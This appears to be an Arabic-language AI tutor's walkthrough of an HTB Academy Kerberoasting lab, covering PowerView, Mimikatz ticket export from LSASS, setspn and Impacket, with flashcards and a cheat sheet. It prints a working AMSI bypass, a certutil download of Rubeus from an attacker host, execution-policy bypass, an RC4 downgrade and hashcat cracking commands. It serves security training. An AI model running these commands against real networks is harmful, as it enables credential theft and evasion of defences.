✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر) — من فتح الـ RDP إلى كسر الهاش بالـ Hashcat وطلعنا الباسورد `virtualpc1`.

✅ الـ bypasses والـ variations والفخوخ — غطينا شنو تسوي لو شفت AES أو لو انحذف Rubeus.

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. بالتوفيق! 💪




تمام! استلمت التحدي. خلني أشرحلك إياه من الألف للياء:

🟢 Big Picture → 🔵 المصطلحات → 🟡 تحليل التحدي → 🟠 الاستغلال → 🔴 ماذا لو → 💎 فلاشكاردز → 📄 ورقة غش

يله نبدأ...

━━━━━

🟢 المرحلة 0: ما قبل الصفر — Big Picture

⚠️ ركز وياي زين هسة. بالجزء الأول تعلمنا الأساسيات وافترضنا إن الطريق سالك وأداة Rubeus تشتغل بدون مشاكل. لكن بالواقع، شبكات الشركات الكبيرة (Enterprise Networks) مو بهذي السهولة.

تخيل نفس مدينة الملاهي اللي حكينا عنها (الـ Active Directory). بالجزء الأول، رحنا كبل لشباك التذاكر وطلبنا التذكرة بأداة Rubeus. هسة، تخيل إن إدارة الملاهي وظفت حراس أمن متشددين جداً (برامج الحماية، EDR، و Windows Defender). هذولي الحراس يعرفون شكل أداة Rubeus، وبمجرد ما يشوفوك شايلها، راح يطردوك من الشبكة ويدكون جرس الإنذار (Alerts لـ Blue Team).

شنو الحل؟ الهكر المحترف (Red Teamer) ما يعتمد على أداة وحدة. إذا الباب الرئيسي مقفول، ندخل من الشباك. بهذا التحدي المتقدم، راح نتعلم "فنون النينجا" بالـ Kerberoasting:

١. استخدام أدوات النظام ضده (Living off the Land):

بدل ما نجيب أدوات هكر غريبة تفضحنا، راح نستخدم أدوات الويندوز الرسمية (مثل `setspn.exe` أو PowerShell). الحارس الأمني من يشوفك تستخدم أدوات الويندوز الأصلية، ما راح يشك بيك، لأن الموظفين العاديين ومدراء النظام (System Admins) يستخدموها كل يوم!

٢. سرقة التذاكر من الجيوب (Mimikatz):

بدل ما نروح نطلب تذكرة جديدة من الشباك (Domain Controller) ونلفت الانتباه، شنو رأيك ندور بجيوب الموظفين اللي ديشغلون الحاسبة مالتنا هسة؟ الويندوز يحتفظ بكل التذاكر بذاكرة خاصة (LSASS). إذا كان عندنا صلاحية "مدير" (Administrator)، نكدر نمد إيدنا بهاي الذاكرة ونسحب التذاكر اللي ديستخدموها حالياً بدون ما نكلم الـ DC أصلاً!

٣. الهجوم عن بعد (Remote Attacks):

ليش أصلاً ندخل داخل حاسبة الويندوز ونخاطر؟ إذا كان عندنا يوزر وباسورد مالت موظف، نكدر من كالي لينكس مالتنا (اللي مابيه أي برامج حماية تمنعنا) نرسل طلبات للـ Domain Controller مباشرة باستخدام بايثون (أداة Impacket). هذي الطريقة هي الأأمن والأكثر صمتاً.

الهدف من هذا الدرس:

تتعلم شلون تصير مرن. الـ Tool ممكن تنكشف وتفشل، بس الـ Concept (المفهوم) شغال دايماً. راح نتعلم ٤ طرق بديلة للـ Kerberoasting، ونتعلم شلون نتجاوز أقوى الدفاعات مثل تشفير AES-256 ونظام حماية السكريبتات AMSI.

━━━━━

🔵 المرحلة 1: المصطلحات

راح نمر على المصطلحات الجديدة والمتقدمة اللي انذكرت بهذا السيناريو. افهمها زين لأنها لغة الهكرز المحترفين.

PowerView (أداة باور فيو)

- شنو يعني؟ سكريبت مكتوب بلغة PowerShell يعتبر رادار مرعب داخل الـ Active Directory. ماكو هكر AD ما يستخدمه. يكشفلك كل اليوزرات، الجروبات، والصلاحيات بدون ما يسوي ضجة كبيرة. بي أمر مخصص للـ Kerberoasting.
    

Mimikatz (أداة ميميكاتز)

- شنو يعني؟ الأسطورة. أداة فرنسية صممها شخص اسمه (Benjamin Delpy). وظيفتها الأساسية قراءة ذاكرة الويندوز واستخراج الباسوردات والتذاكر منها. مرعبة لدرجة إن مايكروسوفت تبني تحديثات كاملة بس حتى توقفها.
    
- وين يظهر بالأوامر؟ نشغلها كـ `mimikatz.exe` ونكتب أوامر بداخلها مثل `sekurlsa::tickets`.
    

LSASS (Local Security Authority Subsystem Service)

- شنو يعني؟ الخزنة السرية مالت الويندوز. هو Process (عملية) يشتغل بالخلفية ويحفظ كل الباسوردات والـ Hashes والـ Kerberos Tickets للمستخدمين اللي مسوين Login. الـ Mimikatz شغلته الوحيدة يكسر هاي الخزنة ويقراها.
    

LOLBins (Living Off The Land Binaries)

- شنو يعني؟ "العيش على موارد الأرض". يعني تستخدم برامج الويندوز الأصلية الموجودة أصلاً بالنظام (مثل `certutil`, `setspn`, `powershell`) في عمليات الاختراق. ميزتها؟ الـ Antivirus يثق بيها ١٠٠٪ لأنها ملفات تابعة لمايكروسوفت وموقعة رقمياً.
    

AMSI (Antimalware Scan Interface)

- شنو يعني؟ واجهة فحص ضيفت للويندوز حتى تحل مشكلة الـ PowerShell. قبل، الهكرز جانوا يشغلون سكريبتات بالذاكرة والـ Antivirus ما يشوفها. AMSI يجبر أي سكريبت PowerShell يمر على الفحص قبل ما يتنفذ. لازم نسويله Bypass (تجاوز) حتى نشغل PowerView.
    

EType / Encryption Type (نوع التشفير)

- شنو يعني؟ رقم يحدد نوع التشفير مال تذكرة الكيربيروس.
    
- EType 23: يعني RC4 (تشفير قديم، ضعيف، ينكسر بثواني).
    
- EType 18: يعني AES-256 (تشفير حديث، قوي جداً، ياخذ أيام أو أسابيع للكسر).
    

.kirbi (ملف الكيربي)

- شنو يعني؟ الامتداد الخاص بملفات تذاكر Kerberos من تستخرجها بشكل خام (Raw) من الذاكرة باستخدام Mimikatz. هذا الملف ما تكدر تكسره بـ Hashcat مباشرة، لازم تحوله إلى نص Hash بالبداية.
    

Impacket (حزمة إمباكيت)

- شنو يعني؟ مجموعة سكريبتات مكتوبة بـ Python باللينكس، تتحدث نفس لغة الويندوز والـ AD. تسمحلك تهاجم الويندوز من داخل الكالي لينكس مالتك بدون ما تحتاج تدخل RDP للضحية.
    

Execution Policy (سياسة التنفيذ)

- شنو يعني؟ إعداد بالويندوز يمنع تشغيل سكريبتات PowerShell (ملفات .ps1) اللي ما تحمل توقيع رقمي. هاي مو ميزة أمنية قوية، هي مجرد حماية من الأخطاء، ونتجاوزها بكلمة `Bypass`.
    

━━━━━

🟡 المرحلة 2: تحليل التحدي + كيف تفكر

📖 ترجمة السيناريو الحالي:

السؤال يطلب منك الحصول على نفس التذكرة للحساب `vmware/inlanefreight.local` وكسرها، لكن هذه المرة يفترض أن الأداة السهلة (Rubeus) غير متاحة، أو أن هناك قيوداً تمنعك من استخدامها. يجب عليك إيجاد طرق بديلة للوصول للهدف.

🎯 المعطيات والقيود:

- قد لا تمتلك أدوات جاهزة على القرص الصلب (Hard Disk).
    
- قد يتدخل Windows Defender لحذف أي برنامج ضار.
    
- قد تكون التذاكر المطلوبة مخزنة بالفعل في الذاكرة ولا حاجة لطلبها من الـ DC.
    

🧭 كيف تفكر؟ (Decision Tree متقدمة للـ Kerberoasting):

أنا بحاجة لتذكرة TGS، ما هي خياراتي بناءً على وضعي الحالي؟

├── هل أمتلك صلاحيات مدير (Local Administrator) على هذه الحاسبة؟

│ ├── نعم: ممتاز! لا تطلب تذكرة جديدة. استخدم `Mimikatz` لسرقة التذاكر الموجودة أصلاً في ذاكرة الـ LSASS. (أهدأ طريقة).

│ └── لا: أنا مستخدم عادي. انتقل للفرع التالي.

│

├── هل أستطيع نقل ملفات من الكالي إلى الويندوز؟ (Rubeus)

│ ├── لا، الـ Antivirus يحذفها فوراً. انتقل للفرع التالي.

│ └── نعم: استخدم Rubeus.

│

├── هل الـ PowerShell مسموح ويعمل؟

│ ├── نعم: استخدم أداة `PowerView`. إذا اعترض الـ AMSI، قم بعمل Bypass له.

│ └── لا: استخدم أدوات الويندوز الأصلية.

│

├── هل توجد أدوات الويندوز الأصلية الخاصة بالـ AD (RSAT)؟

│ ├── نعم: استخدم وحدة `ActiveDirectory` في الـ PowerShell.

│ └── لا: استخدم أداة `setspn.exe` المدمجة بالويندوز من أيام XP لاستخراج اسم الحساب على الأقل.

│

└── هل أستطيع الوصول للـ Domain Controller من الكالي لينكس عبر الشبكة؟

└── نعم: اترك الويندوز تماماً! استخدم `Impacket (GetUserSPNs.py)` من الكالي براحتك.

🗺️ خريطة الهجوم (Roadmap) للسيناريوهات البديلة:

١. [الطريق الأول - PowerShell]: تحميل PowerView للذاكرة، تجاوز سياسة التنفيذ، وسحب الهاش.

٢. [الطريق الثاني - الذاكرة]: الدخول كـ Admin، تشغيل Mimikatz، سحب التذاكر بصيغة `.kirbi`، تحويلها باللينكس، ثم كسرها.

٣. [الطريق الثالث - النينجا]: استخدام `setspn.exe` وأدوات النظام كـ LOLBins لجمع المعلومات بهدوء تام.

٤. [الطريق الرابع - اللينكس]: الهجوم من بُعد باستخدام أدوات Impacket بدون لمس الويندوز.

الآن، لننتقل إلى التنفيذ العملي لكل طريقة من هذه الطرق.

━━━━━

🟠 المرحلة 3: الاستغلال التفصيلي

هنا راح نستعرض الطرق الأربعة البديلة، خطوة بخطوة.

━━━━━━━━━━━━━━

النهج الأول: أداة PowerView (عبر الـ PowerShell)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

إذا كانت ملفات الـ exe (مثل Rubeus) ممنوعة أو تنحذف، الـ PowerShell هو بيئة ممتازة لأنها جزء من النظام. راح نستخدم سكريبت PowerView اللي يسوي كل الشغل.

🔧 الأمر (داخل PowerShell بالويندوز):

PowerShell

```
Import-Module C:\Tools\PowerView.ps1
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname
```

💡 ليش هذا الأمر؟

- `Import-Module`: هذا الأمر يحمّل السكريبت للذاكرة حتى نكدر نستخدم أوامره.
    
- `Get-DomainUser -SPN`: هذا أمر داخل PowerView يسحب كل اليوزرات اللي عدهم SPN مسجل (يعني Kerberoastable).
    
- `Select-Object`: حتى ننظف الشاشة ونعرض بس اسم اليوزر واسم الـ SPN وما نغرق بالمعلومات.
    

📤 الـ Output المتوقع (Recon):

Plaintext

```
samaccountname   serviceprincipalname
--------------   --------------------
sqldev           MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
svc_vmware       vmware/inlanefreight.local
backupagent      backupjob/veam.inlanefreight.local:4444
```

✅ الخطوة التالية (الهجوم وسحب الهاش):

بما إنه عرفنا الحساب موجود، نستخدم أمر الهجوم بـ PowerView.

🔧 الأمر:

PowerShell

```
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File C:\Temp\pv_hashes.txt
```

💡 شرح: `Invoke-Kerberoast` هو الأمر اللي يطلب التذاكر. `-OutputFormat Hashcat` هذا فلاج عظيم يخلي الناتج جاهز للنسخ لـ Hashcat مباشرة. `Out-File` يكتب الناتج بملف.

━━━━━━━━━━━━━━

النهج الثاني: أداة Mimikatz (سرقة التذاكر من الذاكرة)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

تخيل إن موظف الـ IT أو مدير النظام دخل للـ VMware قبل شوية. هذا يعني إن تذكرة الـ VMware موجودة حالياً بذاكرة حاسبته! إذا كنا نملك صلاحية Administrator، نكدر نفتح الذاكرة ونسرقها جاهزة.

🔧 الأمر (افتح CMD كـ Administrator وشغل ميميكاتز):

DOS

```
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

💡 ليش هاي الأوامر؟

- `privilege::debug`: هذا الأمر يفحص إذا كنت Admin وينطيك صلاحية `SeDebugPrivilege` اللي تسمحلك تقرأ ذاكرة نظام الويندوز (LSASS). إذا شفت `20 OK` يعني أنت جاهز.
    
- `sekurlsa::tickets /export`: هذا الأمر يبحث بذاكرة LSASS عن أي تذكرة Kerberos ويستخرجها ويحفظها كملف بالقرص الصلب.
    

📤 الـ Output المتوقع:

Plaintext

```
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 291923 (00000000:00047453)
Session           : Interactive from 1
User Name         : htb-student
Domain            : INLANEFREIGHT
...
* [0] - 0x17 - rc4_hmac_nt
     Start/End/MaxRenew: 7/31/2026 10:00:00 ...
     Service Name (02) : vmware ; inlanefreight.local
     Target Name  (02) : vmware ; inlanefreight.local

  [Saving 0-40a10000-htb-student@vmware~inlanefreight.local-INLANEFREIGHT.LOCAL.kirbi]
```

✅ الخطوة التالية:

الميميكاتز حفظ التذكرة كملف اسمه ينتهي بـ `.kirbi`. هذا الملف خام. لازم ننقله للينكس مالتنا ونحوله.

🔧 الأمر باللينكس (للتحويل والكسر):

Bash

```
python3 kirbi2hashcat.py ticket.kirbi > hash.txt
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

💡 `kirbi2hashcat.py` هو سكريبت يحول الملف الخام إلى نص الهاش الطويل اللي يفهمه Hashcat ويبدأ بـ `$krb5tgs$23$`.

⏸️ Mini-check: هل النتيجة منطقية؟ نعم، الهاشكات راح يكسره ويطلع `virtualpc1` نفس الطريقة السابقة بالضبط، بس مصدر التذكرة اختلف!

━━━━━━━━━━━━━━

النهج الثالث: أداة setspn.exe (أسلوب الـ LOLBins المكتوم)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

إذا ردت بس تجاوب على السؤال الأول (شنو اسم اليوزر مال الخدمة) بدون ما تنزل أي أداة هكر وبدون ما تلفت أي انتباه. راح نستخدم أداة `setspn` الأصلية بالويندوز.

🔧 الأمر (بأي CMD):

DOS

```
setspn -T inlanefreight.local -Q */*
```

أو للبحث عن خدمة معينة مباشرة:

DOS

```
setspn -Q vmware/inlanefreight.local
```

💡 ليش هذا الأمر؟

- `-T`: تحديد الـ Domain.
    
- `-Q */*`: Query لكل الخدمات المسجلة.
    
- هذه الأداة مخصصة لمدراء الشبكات، لذلك لا يوجد أي Antivirus يمنعها!
    

📤 الـ Output المتوقع:

Plaintext

```
Checking domain DC=inlanefreight,DC=local

CN=svc_vmware,OU=Service Accounts,OU=Corp,DC=inlanefreight,DC=local
        vmware/inlanefreight.local

Existing SPN found!
```

✅ الخطوة التالية:

عرفنا اسم الحساب `svc_vmware`. لكن انتبه: `setspn` ما يسحب التذكرة! هو فقط للـ Recon. لسحب التذكرة، لازم تستخدم إحدى الطرق الأخرى.

━━━━━━━━━━━━━━

النهج الرابع: أداة GetUserSPNs.py (الضربة عن بعد من اللينكس)

━━━━━━━━━━━━━━

📌 ليش نسوي هاي الخطوة؟

ليش نتعب نفسنا داخل الويندوز ونتعارك ويا الـ Defender والـ AMSI؟ إذا كان عندنا IP الـ Domain Controller، واسم يوزر وباسورد، نكدر نسوي الهجوم وإحنا كاعدين مرتاحين بالكالي لينكس!

🔧 الأمر (من الكالي لينكس):

Bash

```
GetUserSPNs.py inlanefreight.local/htb-student:'Academy_student_AD!' -dc-ip TARGET_DC_IP -request -outputfile linux_hashes.txt
```

💡 ليش هذا الأمر بالذات؟

- `GetUserSPNs.py`: سكريبت عظيم من حزمة Impacket.
    
- `inlanefreight.local/htb-student`: نحدد الدومين واليوزر مالتنا.
    
- `-dc-ip`: نعطيه IP الـ Domain controller حتى يروح يطلب منه التذاكر مباشرة.
    
- `-request`: هذا الفلاج يكوله: "أرجوك لا بس تستعرض الأسماء، اطلب التذاكر التشفيرية أيضاً".
    
- `-outputfile`: حفظ الهاشات الجاهزة بملف.
    

📤 الـ Output المتوقع:

Plaintext

```
ServicePrincipalName          Name          MemberOf           PasswordLastSet
----------------------------  ------------  -----------------  -------------------
vmware/inlanefreight.local    svc_vmware    Domain Users       2021-09-13 06:02:16

$krb5tgs$23$*svc_vmware$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local*$...(hash)...
```

✅ الخطوة التالية:

صار عندك الهاش الجاهز بداخل اللينكس مباشرة! لا نقل ملفات ولا وجع راس. تاخذ الملف وتطقه بـ Hashcat `-m 13100` وينتهي الموضوع.

📊 ملخص الأساليب (Attack Pathways ASCII):

```
[Attacker Goal: Get Encrypted TGS]

Way 1 (Memory)   : Mimikatz ──> Reads LSASS ──> Gets .kirbi ──> kirbi2hashcat
Way 2 (PS Script): PowerView ──> Asks DC ──> Outputs Hashcat format
Way 3 (Remote)   : Impacket ──> Network Request to DC ──> Saves Hash on Kali
Way 4 (Standard) : Rubeus ──> Asks DC ──> Outputs Hashcat format
```

📐 ملخص نتائج الأدوات:

|**الأداة**|**هل تتطلب Admin؟**|**هل تستخرج الهاش؟**|**هل هي أداة ويندوز أصلية؟**|
|---|---|---|---|
|Mimikatz|نعم 🛑|نعم (بصيغة kirbi)|لا|
|PowerView|لا|نعم (جاهز)|لا (سكربت)|
|setspn.exe|لا|لا (فقط استطلاع)|نعم ✅|
|Impacket|لا (من الكالي)|نعم (جاهز)|لا (باللينكس)|

━━━━━

🔴 المرحلة 4: ماذا لو تغير؟ (Variations + Bypasses + Traps)

هذا هو الـ Masterclass. هنا نميز بين الحافظ والفاهم. ماذا تفعل عندما تفشل الخطة أ؟

🔄 Variations محتملة وتجاوزها (Bypasses):

🎓 Variation 1: ماذا لو كان الـ Rubeus غير موجود على الويندوز والإنترنت مفصول؟

إذا ما عندك `C:\Tools\Rubeus.exe`، لازم تنقله من الكالي للويندوز المخترق بدون ما يشك الـ Antivirus.

- الحل (LOLBin Download): افتح سيرفر ويب بالكالي `python3 -m http.server 8080`.
    
    ثم من الويندوز، استخدم أداة `certutil.exe` (أداة ويندوز رسمية للشهادات الرقمية بس نستخدمها كـ Download Manager).
    
    🔧 الأمر:
    

DOS

```
certutil.exe -urlcache -split -f http://KALI_IP:8080/Rubeus.exe C:\Temp\Rubeus.exe
```

💡 الأداة راح تسحب الملف وتخزنه. مرات نغير اسم الـ exe حتى نتجاوز الفحص السطحي.

🎓 Variation 2: ماذا لو كانت التذكرة مشفرة بـ AES-256 وليس RC4؟

من تسوي استطلاع، وتشوف الـ EncryptionType هو AES-256، يعني الهاش راح يبدأ بـ `$krb5tgs$18$`. تشفير AES قوي جداً جداً ويكلف أيام لكسره.

- الحل الأول (محاولة إجبار الـ DC على إعطائنا RC4 - Downgrade Attack):
    
    نستخدم Rubeus بفلاج خاص نخدع بيه الـ DC ونكوله "حاسبتي قديمة ما تدعم AES، انطيني التذكرة بـ RC4".
    
    🔧 الأمر:
    

DOS

```
.\Rubeus.exe kerberoast /tgtdeleg /nowrap
```

- الحل الثاني (إذا فشل الإجبار واضطرينا نكسر الـ AES):
    
    لازم نغير الـ Mode بالـ Hashcat.
    
    🔧 الأمر:
    

Bash

```
hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt
```

⚠️ الـ Mode `19600` هو لـ AES-128 (نوع 17). والـ `19700` هو لـ AES-256 (نوع 18).

🎓 Variation 3: ماذا لو الباسورد مو موجود بـ rockyou.txt؟

طلعتلك رسالة `Status: Exhausted`. يعني القاموس خلص وما لقينا الباسورد.

- الحل (استخدام قواعد التحويل Rules):
    
    الموظفين غالباً يختارون كلمات مثل `Password123!` أو `Company2023`. الـ Rules تاخذ كلمة `password` من القاموس وتولد منها مئات الاحتمالات التلقائية (تضيف أرقام، تكبر حروف).
    
    🔧 الأمر:
    

Bash

```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

وإذا الشركة اسمها `inlanefreight`، استخدم أداة `cewl` لسحب كلمات من موقعهم وسوي قاموس مخصص!

🎓 Variation 4: ماذا لو الـ Windows Defender يعمل وحظر تشغيل PowerView؟

الويندوز هسة بي نظام اسمه AMSI يفحص أي سكريبت PowerShell قبل ما يشتغل. إذا شاف كلمة PowerView، يوقفه ويكتب "تم الحظر".

- الحل (AMSI Bypass):
    
    نحقن كود صغير بالذاكرة يعمي عين الـ AMSI للعملية الحالية (يخدعه ويخليه يرجع نتيجة "آمن" لكل شي). هذا الكود يتنفذ _قبل_ ما نستدعي PowerView.
    
    🔧 الأمر (ينسخ ويلصق بالـ PowerShell):
    

PowerShell

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

💡 بمجرد تنفيذ هذا السطر السحري، الـ AMSI انطفأ بهاي النافذة. هسة تكدر تسوي `Import-Module PowerView` والويندوز راح يكون أعمى وما يعترض!

═══════════

⚠️ أخطاء كارثية شائعة (الفخوخ - Traps):

🚨 الفخ الأول (مع PowerView): رسالة `Execution Policy Error`.

من تحاول تشغل السكريبت يطلعلك أحمر. هذا مو Antivirus، هذا مجرد حظر تشغيل للسكريبتات غير الموقعة.

- الحل: قبل ما تدخل لـ PowerShell، ادخل بهذا الأمر:
    

DOS

```
powershell -ExecutionPolicy Bypass
```

هذا يتجاوز الحماية البسيطة.

🚨 الفخ الثاني (مع Mimikatz): خطأ `ERROR kuhl_m_privilege_debug ; RtlAdjustPrivilege (20) c0000061`.

من تكتب `privilege::debug` يطلعلك هذا الخطأ المرعب.

- السبب: أنت مو Administrator! الـ Mimikatz يحتاج أعلى الصلاحيات حتى يقدر يدخل بذاكرة الويندوز العميقة. إذا شفت هذا الخطأ، اغلق ميميكاتز فوراً، واستخدم Rubeus أو PowerView لأنها أدوات تشتغل بصلاحية يوزر عادي وتطلب التذكرة عبر الشبكة بدل سرقتها من الذاكرة.
    

🚨 الفخ الثالث (مع setspn): الاعتقاد بأنه يخترق.

الطلاب الجدد يكتبون أمر `setspn` ويشوفون اسم اليوزر، ويدورون وين الـ Hash! أداة `setspn` فقط (Recon). ما تجيب تذاكر، ولا تسوي استغلال. لازم تكمل بـ Rubeus أو Impacket.

🚨 الفخ الرابع (نتيجة /stats فارغة):

إذا شغلت `Rubeus /stats` وما طلعلك أي يوزر، ممكن:

1. أنت ما متصل بالدومين بشكل صحيح. شيك `whoami /fqdn`.
    
2. الدومين كنترولر ما يرد. شيك `ping inlanefreight.local`.
    
3. فعلاً ماكو حسابات مصابة بالشركة (هنا لازم تغير مسار الهجوم بالكامل إلى AS-REP Roasting مثلاً).
    

🔑 Golden Tips (نصيحة ذهبية):

"دائماً خلي حزمة Impacket (خصوصاً GetUserSPNs.py و secretsdump.py) هي خيارك الأول إذا كنت تمتلك يوزر وباسورد وأنت خارج بيئة الويندوز. العمل من نظام اللينكس الخاص بيك (Attacker Machine) يعفيك من القلق بشأن الـ Antivirus، الـ AMSI، وقيود نقل الملفات. العب بملعبك مو بملعبهم!"

━━━━━

💎 الفلاشكاردز — ملخص سريع للحفظ

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #1

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الفرق الجوهري بين استخراج التذاكر بـ Rubeus واستخراجها بـ Mimikatz؟

✅ Back: Rubeus يطلب تذكرة جديدة من الـ DC ولا يحتاج صلاحيات Admin. بينما Mimikatz يسرق تذاكر موجودة مسبقاً في ذاكرة LSASS ويشترط وجود صلاحيات Admin.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #2

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: واجهت خطأ Execution Policy عند محاولة تشغيل PowerView. ما هو الحل؟

✅ Back: تشغيل الـ PowerShell مع فلاج التجاوز: `powershell -ExecutionPolicy Bypass`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #3

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: كيف تقوم بتحميل أداة للويندوز عبر سطر الأوامر دون الاعتماد على المتصفح (LOLBin)؟

✅ Back: باستخدام أداة `certutil.exe` المدمجة بالنظام مع الأعلام `-urlcache -split -f`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #4

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: Mimikatz استخرج التذكرة بصيغة `.kirbi`. كيف تكسرها بـ Hashcat؟

✅ Back: يجب تحويلها أولاً إلى نص عبر سكريبت `kirbi2hashcat.py` في اللينكس، ثم استخدام `hashcat -m 13100`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #5

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الـ Mode في Hashcat لتذاكر Kerberos المشفرة بـ AES-256 (EType 18)؟

✅ Back: الـ Mode هو `19700` (بينما `13100` مخصص لـ RC4).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #6

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: أداة الويندوز الأصلية (Native) التي يمكنها استطلاع الـ SPNs بهدوء تام؟

✅ Back: أداة `setspn.exe` (أمر: `setspn -T domain -Q */*`).

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔹 Card #7

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❓ Front: ما هو الـ AMSI ولماذا يهمنا؟

✅ Back: هو نظام فحص للنصوص البرمجية في ويندوز يمنع تشغيل أدوات مثل PowerView. يجب تنفيذ "AMSI Bypass" في الذاكرة لتعميته قبل الاستيراد.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

━━━━━

📄 ورقة الغش (Cheat Sheet) — للسكرين شوت

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📄 المخلص النهائي (Advanced Kerberoasting Cheat Sheet)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

⚔️ خوارزمية اختيار الأداة للـ Kerberoasting:

١. هل أنت خارج الويندوز؟ ← استخدم `Impacket (GetUserSPNs.py)`.

٢. هل أنت داخل الويندوز بـ Admin؟ ← استخدم `Mimikatz` لاستخراجها من الذاكرة خلسة.

٣. هل أنت داخل الويندوز كـ User عادي والملفات غير محظورة؟ ← استخدم `Rubeus`.

٤. هل أنت داخل الويندوز والـ exe محظور؟ ← تجاوز الـ AMSI واستخدم `PowerView.ps1`.

٥. هل تريد جمع معلومات فقط بصمت تام؟ ← استخدم `setspn.exe`.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📐 جدول الأوامر الأساسية المتقدمة:

|**الهدف**|**الأداة / البيئة**|**الأمر**|
|---|---|---|
|سحب عن بعد (Linux)|Impacket|`GetUserSPNs.py domain/user:pass -dc-ip IP -request`|
|فحص الـ SPNs بهدوء|Windows Native|`setspn -T domain.local -Q */*`|
|استيراد PowerView|PowerShell|`Import-Module .\PowerView.ps1`|
|هجوم بـ PowerView|PowerShell|`Invoke-Kerberoast -OutputFormat Hashcat > hash.txt`|
|فحص صلاحية الديباج|Mimikatz|`privilege::debug` (يجب أن يعطي 20 OK)|
|استخراج تذاكر הذاكرة|Mimikatz|`sekurlsa::tickets /export`|
|تنزيل ملف (LOLBin)|cmd (certutil)|`certutil.exe -urlcache -split -f http://IP/file C:\file`|
|تعمية الـ AMSI|PowerShell|`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`|
|تحويل .kirbi|Linux Python|`python3 kirbi2hashcat.py ticket.kirbi > hash.txt`|
|إجبار RC4 Downgrade|Rubeus|`.\Rubeus.exe kerberoast /tgtdeleg /nowrap`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🔢 Hashcat Modes والـ Rules:

|**المهمة**|**الأمر**|
|---|---|
|كسر RC4 (EType 23)|`hashcat -m 13100 hash.txt rockyou.txt`|
|كسر AES-256 (EType 18)|`hashcat -m 19700 hash.txt rockyou.txt`|
|تفعيل الـ Rules (best64)|`hashcat -m 13100 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`|

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🚨 الفخوخ (لا تنساها):

❌ تشغيل Mimikatz بدون "Run as Administrator" ← سيؤدي لخطأ `c0000061`.

❌ تشغيل PowerView بدون Bypass للـ Execution Policy أو AMSI ← حظر فوري للسكريبت.

❌ استخدام الـ Mode `13100` لكسر تذكرة تبدأ بـ `$krb5tgs$18$` ← سيفشل لأنها AES-256 وتحتاج `19700`.

❌ الاعتقاد أن `setspn.exe` يستخرج الهاش ← هو يستخرج الاسم فقط.

❌ إضاعة الوقت في كسر AES-256 بكلمات ضعيفة ← غالباً يتطلب Rules أو Custom Wordlists قوية ويستغرق وقتاً طويلاً.

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 رسالة الختام:

بهيج خلصنا. هسة عندك:

✅ القصة الكبيرة (ليش هالهجوم/التقنية موجودة) — فهمنا إن التنوع بالأدوات هو سلاح الهكر الحقيقي ضد الدفاعات القوية.

✅ كل المصطلحات (PowerView, Mimikatz, LOLBins, AMSI, EType 18...)

✅ كيفية التفكير (decision trees لكل نوع هجوم) — عرفت متى تستخدم Mimikatz (إذا عندك Admin) ومتى ترجع للـ PowerShell.

✅ الاستغلال التفصيلي (خطوة خطوة مع الأوامر) — من أوامر Impacket باللينكس، إلى سرقة التذاكر كـ kirbi وتحويلها.

✅ الـ bypasses والـ variations والفخوخ — غطينا أخطر المواقف: الـ AMSI Bypass، تشفير AES-256، واستخدام certutil للتنزيل.

✅ فلاشكاردز (للمراجعة السريعة)

✅ ورقة الغش (سكرين شوت قبل الـ CTF أو الامتحان)

راجع الفلاشكاردز وورقة الغش قبل كل تحدي — وراح تجد الأنماط مألوفة. هسة أنت مستعد للـ Kerberoasting بأي سيناريو مهما كان معقد! بالتوفيق! 💪


]

```text
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
